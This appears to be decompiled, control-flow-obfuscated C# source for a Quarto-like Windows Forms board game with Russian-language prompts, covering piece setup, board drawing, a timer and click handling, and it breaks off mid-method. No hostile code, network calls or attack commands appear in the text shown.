using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			while (true)
			{
				int num = -43138072;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0xC32D1A01u) % 7u)
					{
					case 5u:
						Square = square;
						num = ((int)num2 * -1585719554) ^ -1058804964;
						continue;
					case 4u:
						Dark = dark;
						num = ((int)num2 * -422423337) ^ 0x1C8484CA;
						continue;
					case 3u:
						num = (int)(num2 * 1714648857) ^ -1838393499;
						continue;
					case 2u:
						Point = point;
						num = ((int)num2 * -1403978394) ^ -734608066;
						continue;
					case 1u:
						Big = big;
						num = (int)((num2 * 304645760) ^ 0x4617BC13);
						continue;
					default:
						return;
					case 6u:
						break;
					case 0u:
						return;
					}
					break;
				}
			}
		}

		public Figurine(Figurine copy)
		{
			while (true)
			{
				int num = -1751740467;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0xCE4344CDu) % 6u)
					{
					case 5u:
						Big = copy.Big;
						Square = copy.Square;
						num = ((int)num2 * -1127130709) ^ 0x599D7E09;
						continue;
					case 4u:
						num = (int)(num2 * 1865196007) ^ -1318340564;
						continue;
					case 3u:
						Point = copy.Point;
						num = ((int)num2 * -230578123) ^ 0x20C95F04;
						continue;
					case 1u:
						Dark = copy.Dark;
						num = (int)(num2 * 1464853482) ^ -1064341792;
						continue;
					default:
						return;
					case 0u:
						break;
					case 2u:
						return;
					}
					break;
				}
			}
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		InitializeComponent();
		Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
		pictureBox = new PictureBox[4, 4];
		borderBox = new PictureBox[4, 4];
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < 4; j++)
			{
				double num = ((j < 2) ? 0.0 : 4.1);
				PictureBox[,] array = pictureBox;
				int num2 = i;
				int num3 = j;
				PictureBox obj = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
				Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)j + num) * (double)size), 4 + i * size));
				Form1.smethod_5((Control)(object)obj, Color.White);
				array[num2, num3] = obj;
				Form1.smethod_6((Control)(object)pictureBox[i, j], new MouseEventHandler(PictureBoxIJ_MouseDown));
				PictureBox[,] array2 = borderBox;
				int num4 = i;
				int num5 = j;
				PictureBox obj2 = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
				Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)j + num) * (double)size), 1 + i * size));
				Form1.smethod_7((Control)(object)obj2, bool_0: false);
				array2[num4, num5] = obj2;
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[i, j]);
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[i, j]);
			}
		}
		Form3 form_ = new Form3();
		Form1.smethod_10((Form)(object)form_, (Form)(object)this);
		menu = (Form)(object)form_;
		Form1.smethod_11((Control)(object)menu);
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = 1097888290;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x24F27AE8u) % 9u)
				{
				case 8u:
					num = ((int)num2 * -789590409) ^ -2073911299;
					continue;
				case 7u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = 45726905;
					continue;
				}
				case 6u:
					Form1.smethod_14(menu);
					num = ((int)num2 * -2072587269) ^ 0x1988D77;
					continue;
				case 5u:
					num = ((int)num2 * -2077491504) ^ 0x75F702A;
					continue;
				case 4u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 1017886679;
						num4 = 1017886679;
					}
					else
					{
						num3 = 1835510298;
						num4 = 1835510298;
					}
					num = num3 ^ (int)(num2 * 1246796113);
					continue;
				}
				case 3u:
					Form1.smethod_15(timer1);
					num = (int)(num2 * 1452336713) ^ -768845437;
					continue;
				case 1u:
					flag = Form1.smethod_16((Control)(object)menu) < 296;
					num = 1429525928;
					continue;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		board = new Figurine[4, 4];
		int num4 = default(int);
		int num3 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = -129596932;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xAC185218u) % 20u)
				{
				case 19u:
					storage[num4, num3] = new Figurine(num4 < 2, num3 % 2 == 0, num3 < 2, num4 % 2 == 1);
					num = -1905044650;
					continue;
				case 18u:
					num = ((int)num2 * -426921859) ^ -1683990089;
					continue;
				case 17u:
					Paint_Storage();
					num = ((int)num2 * -63043388) ^ -1296442234;
					continue;
				case 15u:
					num = (int)(num2 * 1588594157) ^ -1130347686;
					continue;
				case 14u:
					flag = num3 < 4;
					num = -2092291271;
					continue;
				case 13u:
				{
					int num6;
					int num7;
					if (!flag)
					{
						num6 = -323999332;
						num7 = -323999332;
					}
					else
					{
						num6 = -1821838550;
						num7 = -1821838550;
					}
					num = num6 ^ ((int)num2 * -294798275);
					continue;
				}
				case 12u:
					storage = new Figurine[4, 4];
					num = (int)(num2 * 676710582) ^ -601454817;
					continue;
				case 11u:
					num4 = 0;
					num = ((int)num2 * -239163773) ^ -951047495;
					continue;
				case 10u:
					Form1.smethod_5((Control)(object)borderBox[num4, num3], Color.White);
					num = (int)((num2 * 1148912982) ^ 0x102FE01F);
					continue;
				case 9u:
					num = ((int)num2 * -70400202) ^ 0x713D62D4;
					continue;
				case 8u:
				{
					int num5;
					if (num4 >= 4)
					{
						num = -290377545;
						num5 = -290377545;
					}
					else
					{
						num = -331148964;
						num5 = -331148964;
					}
					continue;
				}
				case 7u:
					num3++;
					num = ((int)num2 * -1221054363) ^ -383762891;
					continue;
				case 6u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -830298488) ^ -661743444;
					continue;
				case 5u:
					Form1.smethod_7((Control)(object)pictureBox[num4, num3], bool_0: false);
					num = (int)(num2 * 1420551196) ^ -1014851609;
					continue;
				case 4u:
					num = (int)(num2 * 1331936821) ^ -67905220;
					continue;
				case 3u:
					Paint_Board();
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)((num2 * 1529113804) ^ 0x682DAD6);
					continue;
				case 1u:
					num4++;
					num = ((int)num2 * -1591056699) ^ -407362067;
					continue;
				case 0u:
					num3 = 0;
					num = -464110475;
					continue;
				default:
					return;
				case 2u:
					break;
				case 16u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
		float num14 = default(float);
		float num7 = default(float);
		bool point = default(bool);
		int num9 = default(int);
		int num13 = default(int);
		float num5 = default(float);
		bool big = default(bool);
		float num6 = default(float);
		bool flag2 = default(bool);
		bool dark = default(bool);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		float num8 = default(float);
		bool flag = default(bool);
		while (true)
		{
			int num = 573715545;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x79C151A9u) % 38u)
				{
				case 37u:
					num14 = num7 * 0.4f / (float)Form1.smethod_27(2.0);
					point = board[num9, num13].Point;
					num = (int)((num2 * 549476183) ^ 0x56C6AAD3);
					continue;
				case 36u:
					num5 = 1f;
					num = (int)(num2 * 2023014644) ^ -764454280;
					continue;
				case 35u:
				{
					int num21;
					int num22;
					if (point)
					{
						num21 = 533190855;
						num22 = 533190855;
					}
					else
					{
						num21 = 790596157;
						num22 = 790596157;
					}
					num = num21 ^ (int)(num2 * 884938622);
					continue;
				}
				case 34u:
					num = (int)(num2 * 1510370713) ^ -158779651;
					continue;
				case 33u:
					num = ((int)num2 * -2065525553) ^ -725204254;
					continue;
				case 32u:
					num = (int)((num2 * 1509356234) ^ 0x474CEC6A);
					continue;
				case 31u:
				{
					num14 = num7 * 0.9f / (float)Form1.smethod_27(2.0);
					int num17;
					int num18;
					if (board[num9, num13].Square)
					{
						num17 = 389030162;
						num18 = 389030162;
					}
					else
					{
						num17 = 1506295800;
						num18 = 1506295800;
					}
					num = num17 ^ ((int)num2 * -1749625868);
					continue;
				}
				case 30u:
				{
					int num11;
					int num12;
					if (big)
					{
						num11 = 1464804475;
						num12 = 1464804475;
					}
					else
					{
						num11 = 1604940202;
						num12 = 1604940202;
					}
					num = num11 ^ (int)(num2 * 1988960206);
					continue;
				}
				case 29u:
					num6 = 1f - num5 * 0.4f / (float)Form1.smethod_27(2.0);
					num = 1716548928;
					continue;
				case 28u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 560565203) ^ -92245287;
					continue;
				case 27u:
					num5 = 0.7f;
					num = 1269392981;
					continue;
				case 26u:
					flag2 = num13 < 4;
					num = 1456063422;
					continue;
				case 25u:
					num13++;
					num = 1507556019;
					continue;
				case 24u:
				{
					int num19;
					int num20;
					if (!dark)
					{
						num19 = -2022781372;
						num20 = -2022781372;
					}
					else
					{
						num19 = -1479514238;
						num20 = -1479514238;
					}
					num = num19 ^ (int)(num2 * 1304864843);
					continue;
				}
				case 23u:
					Form1.smethod_24(graphics_, brush_, num8 + (float)(num13 * size), num8 + (float)(num9 * size), num14, num14);
					num = 238912788;
					continue;
				case 22u:
					dark = board[num9, num13].Dark;
					num = ((int)num2 * -1766666080) ^ -882952901;
					continue;
				case 21u:
					num13 = 0;
					num = 983958678;
					continue;
				case 20u:
					num = 190609326;
					continue;
				case 19u:
					num9++;
					num = ((int)num2 * -1035699860) ^ -1239168217;
					continue;
				case 18u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num9 = 0;
					num = (int)(num2 * 422638420) ^ -2061699061;
					continue;
				case 17u:
					num8 = (float)size * (num6 / 2f);
					num = (int)(num2 * 1955571350) ^ -202031450;
					continue;
				case 16u:
					num = 1697874886;
					continue;
				case 15u:
				{
					int num15;
					int num16;
					if (!flag2)
					{
						num15 = -1469226348;
						num16 = -1469226348;
					}
					else
					{
						num15 = -1060820501;
						num16 = -1060820501;
					}
					num = num15 ^ ((int)num2 * -1262438140);
					continue;
				}
				case 14u:
					big = board[num9, num13].Big;
					num = 1264804389;
					continue;
				case 13u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num13 + 0.05f) * (float)size, ((float)num9 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)(num2 * 1652721533) ^ -96934998;
					continue;
				case 12u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num8 + (float)(num13 * size), num8 + (float)(num9 * size), num14, num14);
					num = (int)((num2 * 1224678140) ^ 0x53E9F38B);
					continue;
				case 11u:
					Form1.smethod_28(graphics_, brush_, num8 + (float)(num13 * size), num8 + (float)(num9 * size), num14, num14);
					num = ((int)num2 * -1987645526) ^ -710157663;
					continue;
				case 10u:
					num = (int)(num2 * 485591732) ^ -1281059275;
					continue;
				case 8u:
					flag = board[num9, num13] != null;
					num = (int)(num2 * 2010085637) ^ -1311332781;
					continue;
				case 7u:
					num = (int)((num2 * 1271105767) ^ 0x425F196A);
					continue;
				case 5u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -15475303) ^ 0x289D96F2;
					continue;
				case 4u:
				{
					int num10;
					if (num9 >= 4)
					{
						num = 1666450361;
						num10 = 1666450361;
					}
					else
					{
						num = 1242581310;
						num10 = 1242581310;
					}
					continue;
				}
				case 3u:
					num = (int)(num2 * 600444597) ^ -1749534897;
					continue;
				case 2u:
					num6 = 1f - num5 * 0.9f / (float)Form1.smethod_27(2.0);
					num7 = (float)size * num5;
					num8 = (float)size * (num6 / 2f);
					num = 1816457062;
					continue;
				case 1u:
					brush_ = Form1.smethod_26();
					num = 944895405;
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -610961724;
						num4 = -610961724;
					}
					else
					{
						num3 = -1974410023;
						num4 = -1974410023;
					}
					num = num3 ^ ((int)num2 * -1836434999);
					continue;
				}
				default:
					return;
				case 9u:
					break;
				case 6u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		int num = 0;
		int num4 = default(int);
		Brush brush_ = default(Brush);
		bool point = default(bool);
		float num5 = default(float);
		float num12 = default(float);
		Graphics graphics_ = default(Graphics);
		float num8 = default(float);
		float num7 = default(float);
		bool flag3 = default(bool);
		float num6 = default(float);
		bool flag4 = default(bool);
		bool flag = default(bool);
		bool dark = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num2 = 1638809804;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0x3D2FC3F9u) % 41u)
				{
				case 40u:
					Form1.smethod_20(pictureBox[num, num4], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num, num4]), Form1.smethod_16((Control)(object)pictureBox[num, num4])));
					num2 = (int)((num3 * 138253039) ^ 0x38B3607E);
					continue;
				case 38u:
					brush_ = Form1.smethod_26();
					num2 = 591056469;
					continue;
				case 37u:
					Form1.smethod_30((Control)(object)pictureBox[num, num4]);
					num2 = 1620273299;
					continue;
				case 36u:
					num2 = ((int)num3 * -1624253250) ^ 0x775EBD0A;
					continue;
				case 35u:
					num2 = ((int)num3 * -772123885) ^ -1809443468;
					continue;
				case 34u:
				{
					int num19;
					int num20;
					if (!point)
					{
						num19 = 1596111185;
						num20 = 1596111185;
					}
					else
					{
						num19 = 177259110;
						num20 = 177259110;
					}
					num2 = num19 ^ ((int)num3 * -226165558);
					continue;
				}
				case 33u:
					num5 = 0.7f;
					num2 = 1947335697;
					continue;
				case 32u:
					num2 = ((int)num3 * -1837369085) ^ 0x65EFE5D;
					continue;
				case 31u:
					num12 = 1f - num5 * 0.4f / (float)Form1.smethod_27(2.0);
					num2 = 852082001;
					continue;
				case 30u:
					num12 = 1f - num5 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = 2008592027;
					continue;
				case 29u:
					Form1.smethod_28(graphics_, brush_, num8, num8, num7, num7);
					num2 = (int)((num3 * 1408506486) ^ 0x45BBB706);
					continue;
				case 28u:
					flag3 = num4 < 4;
					num2 = 424221821;
					continue;
				case 27u:
					num8 = (float)size * (num12 / 2f) - 4f;
					num7 = num6 * 0.4f / (float)Form1.smethod_27(2.0);
					num2 = ((int)num3 * -857676377) ^ 0x75A32563;
					continue;
				case 26u:
					brush_ = Form1.smethod_25();
					num2 = ((int)num3 * -173696928) ^ -1327114605;
					continue;
				case 25u:
					point = storage[num, num4].Point;
					num2 = ((int)num3 * -1914594934) ^ 0x1225DDB0;
					continue;
				case 24u:
				{
					int num21;
					int num22;
					if (flag4)
					{
						num21 = -1548626644;
						num22 = -1548626644;
					}
					else
					{
						num21 = -342253427;
						num22 = -342253427;
					}
					num2 = num21 ^ ((int)num3 * -1818192064);
					continue;
				}
				case 23u:
					num2 = (int)((num3 * 2012330212) ^ 0x490C7E3D);
					continue;
				case 22u:
				{
					int num17;
					int num18;
					if (flag)
					{
						num17 = -1059571805;
						num18 = -1059571805;
					}
					else
					{
						num17 = -1668167674;
						num18 = -1668167674;
					}
					num2 = num17 ^ ((int)num3 * -1124181149);
					continue;
				}
				case 21u:
					num2 = (int)((num3 * 2016677451) ^ 0x7B729865);
					continue;
				case 20u:
					num4++;
					num2 = 223422263;
					continue;
				case 19u:
					flag4 = storage[num, num4] != null;
					num2 = 1203396824;
					continue;
				case 18u:
				{
					int num15;
					int num16;
					if (!flag3)
					{
						num15 = -623326371;
						num16 = -623326371;
					}
					else
					{
						num15 = -908497570;
						num16 = -908497570;
					}
					num2 = num15 ^ (int)(num3 * 1316553828);
					continue;
				}
				case 17u:
					num8 = (float)size * (num12 / 2f) - 4f;
					num2 = ((int)num3 * -93490592) ^ -253790976;
					continue;
				case 16u:
					dark = storage[num, num4].Dark;
					num2 = (int)((num3 * 1372875723) ^ 0x6D175233);
					continue;
				case 15u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num8, num8, num7, num7);
					num2 = (int)((num3 * 1730342117) ^ 0xABFD262);
					continue;
				case 14u:
					flag2 = num4 < 2;
					num2 = (int)((num3 * 1705205308) ^ 0x3BE20835);
					continue;
				case 13u:
				{
					int num13;
					int num14;
					if (flag2)
					{
						num13 = -644851705;
						num14 = -644851705;
					}
					else
					{
						num13 = -1374622434;
						num14 = -1374622434;
					}
					num2 = num13 ^ (int)(num3 * 1976842431);
					continue;
				}
				case 12u:
				{
					int num11;
					if (!storage[num, num4].Big)
					{
						num2 = 1764543989;
						num11 = 1764543989;
					}
					else
					{
						num2 = 1303671589;
						num11 = 1303671589;
					}
					continue;
				}
				case 11u:
				{
					int num9;
					int num10;
					if (!dark)
					{
						num9 = 205891031;
						num10 = 205891031;
					}
					else
					{
						num9 = 1200966841;
						num10 = 1200966841;
					}
					num2 = num9 ^ ((int)num3 * -1452073356);
					continue;
				}
				case 10u:
					num4 = 0;
					num2 = 2099157480;
					continue;
				case 8u:
					Form1.smethod_24(graphics_, brush_, num8, num8, num7, num7);
					num2 = 1356153059;
					continue;
				case 7u:
					num7 = num6 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = ((int)num3 * -73294332) ^ -1501921021;
					continue;
				case 6u:
					num6 = (float)size * num5;
					num2 = (int)(num3 * 762748267) ^ -1763689824;
					continue;
				case 5u:
					num2 = ((int)num3 * -1362512580) ^ -998473451;
					continue;
				case 4u:
					num2 = (int)(num3 * 649618557) ^ -1923004489;
					continue;
				case 3u:
					flag = num < 4;
					num2 = 1340797471;
					continue;
				case 2u:
					num5 = 1f;
					num2 = ((int)num3 * -660184228) ^ -2012127487;
					continue;
				case 1u:
					num++;
					num2 = ((int)num3 * -175004087) ^ 0x186A7D16;
					continue;
				case 0u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num, num4]));
					num2 = ((int)num3 * -1053047054) ^ -528204388;
					continue;
				default:
					return;
				case 39u:
					break;
				case 9u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		int num3 = default(int);
		int num4 = default(int);
		int num6 = default(int);
		int num7 = default(int);
		while (true)
		{
			int num = -361165670;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xEAD05F73u) % 29u)
				{
				case 28u:
					num = (int)((num2 * 1828510822) ^ 0x9F613CF);
					continue;
				case 27u:
					step = 0;
					num = (int)(num2 * 1998653731) ^ -391908735;
					continue;
				case 26u:
				{
					int num10;
					if (num3 >= 4)
					{
						num = -768630563;
						num10 = -768630563;
					}
					else
					{
						num = -455463017;
						num10 = -455463017;
					}
					continue;
				}
				case 25u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					Form1.smethod_35(timer1, bool_0: true);
					num = ((int)num2 * -593396876) ^ 0x7D5E1B69;
					continue;
				case 24u:
					Form1.smethod_7((Control)(object)pictureBox[num4, num3], bool_0: true);
					num = -1849709550;
					continue;
				case 23u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)((num2 * 2127003037) ^ 0x2136AE6F);
					continue;
				case 22u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -1234345246) ^ -457424931;
					continue;
				case 21u:
				{
					int num8;
					int num9;
					if (turn)
					{
						num8 = 1179384051;
						num9 = 1179384051;
					}
					else
					{
						num8 = 1477102362;
						num9 = 1477102362;
					}
					num = num8 ^ (int)(num2 * 1881558368);
					continue;
				}
				case 20u:
					step = 1;
					num = ((int)num2 * -993200775) ^ 0x73635959;
					continue;
				case 19u:
					Form1.smethod_36(timer1);
					num = ((int)num2 * -901723127) ^ -1367780093;
					continue;
				case 18u:
					num = (int)((num2 * 1877067367) ^ 0x7A4E373D);
					continue;
				case 17u:
					num = (int)((num2 * 2012690935) ^ 0x55554D78);
					continue;
				case 16u:
					num = ((int)num2 * -2078494105) ^ 0x442F88E6;
					continue;
				case 15u:
					num = (int)(num2 * 1915490558) ^ -842522063;
					continue;
				case 14u:
					num4++;
					num = (int)(num2 * 1481779172) ^ -1432682240;
					continue;
				case 13u:
					num3++;
					num = ((int)num2 * -2133558894) ^ -1625683404;
					continue;
				case 12u:
					Form1_Load(this, Form1.smethod_31());
					num = ((int)num2 * -1374035399) ^ -979401789;
					continue;
				case 11u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = -2077496298;
					continue;
				case 10u:
					Form1.smethod_5((Control)(object)borderBox[num6, num7], Color.Blue);
					num = ((int)num2 * -1178893291) ^ 0x7B7EED9E;
					continue;
				case 9u:
					num4 = 0;
					num = (int)((num2 * 534401847) ^ 0x475C6496);
					continue;
				case 7u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = ((int)num2 * -1077622788) ^ -717124783;
					continue;
				case 6u:
					num = (int)(num2 * 1338094490) ^ -15558924;
					continue;
				case 5u:
					num6 = Form1.smethod_33(rnd, 4);
					num7 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -1003692481) ^ 0x1AD943EE;
					continue;
				case 3u:
					num = (int)((num2 * 120944565) ^ 0x145F5091);
					continue;
				case 2u:
				{
					int num5;
					if (num4 < 4)
					{
						num = -36819244;
						num5 = -36819244;
					}
					else
					{
						num = -739613388;
						num5 = -739613388;
					}
					continue;
				}
				case 1u:
					num = -194663411;
					continue;
				case 0u:
					num3 = 0;
					num = -1954299527;
					continue;
				default:
					return;
				case 8u:
					break;
				case 4u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		time = time.AddSeconds(1.0);
		while (true)
		{
			int num = 616128466;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x41B0C501u) % 4u)
				{
				case 3u:
					Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
					num = (int)((num2 * 1635707583) ^ 0x364AFAA5);
					continue;
				case 1u:
					num = (int)((num2 * 1643552995) ^ 0x3434124);
					continue;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0251: Unknown result type (might be due to invalid IL or missing references)
		//IL_0267: Expected O, but got Unknown
		Point point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
		int num5 = default(int);
		bool flag = default(bool);
		int num7 = default(int);
		int num4 = default(int);
		int num3 = default(int);
		while (true)
		{
			int num = -1697881291;
			while (true)
			{
				uint num2;
				int num6;
				switch ((num2 = (uint)num ^ 0xD04034A7u) % 24u)
				{
				case 23u:
					num = ((int)num2 * -1528730032) ^ -222849719;
					continue;
				case 22u:
					num5 -= 4;
					num = (int)(num2 * 1766942462) ^ -1064639596;
					continue;
				case 21u:
				{
					int num9;
					int num10;
					if (!flag)
					{
						num9 = 1848091624;
						num10 = 1848091624;
					}
					else
					{
						num9 = 2000914171;
						num10 = 2000914171;
					}
					num = num9 ^ ((int)num2 * -1208857737);
					continue;
				}
				case 20u:
					num5 = point.X / size;
					num = ((int)num2 * -86592648) ^ 0xFC1F847;
					continue;
				case 19u:
					num7++;
					num = (int)(num2 * 1884241546) ^ -1149199166;
					continue;
				case 18u:
					num4 = point.Y / size;
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = ((int)num2 * -1597251107) ^ -1468857039;
					continue;
				case 17u:
					num = ((int)num2 * -159501130) ^ 0x38BC62D;
					continue;
				case 16u:
				{
					int num12;
					int num13;
					if (num5 > 1)
					{
						num12 = -1421456055;
						num13 = -1421456055;
					}
					else
					{
						num12 = -1512014416;
						num13 = -1512014416;
					}
					num = num12 ^ (int)(num2 * 1946725184);
					continue;
				}
				case 15u:
					if (storage[num4, num5] != null)
					{
						num = -390871380;
						continue;
					}
					num6 = 0;
					goto IL_0125;
				case 14u:
				{
					int num11;
					if (num3 < 4)
					{
						num = -490747254;
						num11 = -490747254;
					}
					else
					{
						num = -116981956;
						num11 = -116981956;
					}
					continue;
				}
				case 13u:
					Form1.smethod_5((Control)(object)borderBox[num7, num3], Color.White);
					num = -347812050;
					continue;
				case 11u:
				{
					int num8;
					if (num7 < 4)
					{
						num = -2021009547;
						num8 = -2021009547;
					}
					else
					{
						num = -1664615691;
						num8 = -1664615691;
					}
					continue;
				}
				case 10u:
					Form1.smethod_5((Control)(object)borderBox[num4, num5], Color.Red);
					num = ((int)num2 * -1202091548) ^ 0x6F24FB00;
					continue;
				case 9u:
					num = ((int)num2 * -999904868) ^ 0x5306414F;
					continue;
				case 7u:
					num7 = 0;
					num = (int)(num2 * 1124379870) ^ -1114120832;
					continue;
				case 6u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = ((int)num2 * -1132738700) ^ -1288340042;
					continue;
				case 5u:
					num = (int)(num2 * 1751655094) ^ -2104652190;
					continue;
				case 4u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)((num2 * 824792088) ^ 0x7CCAB6C7);
					continue;
				case 3u:
					num6 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num4, num5]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_0125;
				case 2u:
					num3 = 0;
					num = -649098103;
					continue;
				case 1u:
					num3++;
					num = (int)((num2 * 209998575) ^ 0x9933A6E);
					continue;
				case 0u:
					num = ((int)num2 * -851866853) ^ 0x40986966;
					continue;
				default:
					return;
				case 8u:
					break;
				case 12u:
					return;
					IL_0125:
					flag = (byte)num6 != 0;
					num = -578324486;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0291: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a7: Expected O, but got Unknown
		int num4 = default(int);
		int num6 = default(int);
		int num5 = default(int);
		int num3 = default(int);
		bool flag = default(bool);
		bool flag2 = default(bool);
		Graphics graphics_ = default(Graphics);
		while (true)
		{
			int num = -643520186;
			while (true)
			{
				uint num2;
				int num7;
				switch ((num2 = (uint)num ^ 0xFA28F98Du) % 23u)
				{
				case 22u:
					num = (int)((num2 * 122934341) ^ 0x619945FD);
					continue;
				case 21u:
					num4 = 0;
					num = -64183073;
					continue;
				case 20u:
					Form1.smethod_30((Control)(object)pictureBox1);
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = ((int)num2 * -456120076) ^ -855619696;
					continue;
				case 19u:
					Paint_Board();
					num = (int)((num2 * 1961450210) ^ 0x2810142D);
					continue;
				case 17u:
					num7 = ((board[num6, num5] == null) ? 1 : 0);
					goto IL_0079;
				case 16u:
				{
					int num9;
					if (!(Form1.smethod_41((Control)(object)borderBox[num3, num4]) == Color.Blue))
					{
						num = -529272044;
						num9 = -529272044;
					}
					else
					{
						num = -1358948999;
						num9 = -1358948999;
					}
					continue;
				}
				case 15u:
					flag = num3 < 4;
					num = -1005851722;
					continue;
				case 13u:
					num = (int)(num2 * 1007494764) ^ -1790816862;
					continue;
				case 12u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = ((int)num2 * -215527345) ^ 0x60422BEB;
					continue;
				case 11u:
					num3++;
					num = ((int)num2 * -1116283739) ^ 0x530DBB75;
					continue;
				case 10u:
					num = (int)(num2 * 751154052) ^ -640309699;
					continue;
				case 9u:
				{
					int num12;
					int num13;
					if (!flag)
					{
						num12 = 526958405;
						num13 = 526958405;
					}
					else
					{
						num12 = 1426687107;
						num13 = 1426687107;
					}
					num = num12 ^ ((int)num2 * -1372618946);
					continue;
				}
				case 8u:
				{
					int num10;
					int num11;
					if (!flag2)
					{
						num10 = 947986389;
						num11 = 947986389;
					}
					else
					{
						num10 = 920424137;
						num11 = 920424137;
					}
					num = num10 ^ (int)(num2 * 769762150);
					continue;
				}
				case 7u:
				{
					int num8;
					if (num4 >= 4)
					{
						num = -447674549;
						num8 = -447674549;
					}
					else
					{
						num = -1350864999;
						num8 = -1350864999;
					}
					continue;
				}
				case 6u:
					Form1.smethod_45(graphics_);
					num = (int)(num2 * 126718155) ^ -702833784;
					continue;
				case 5u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
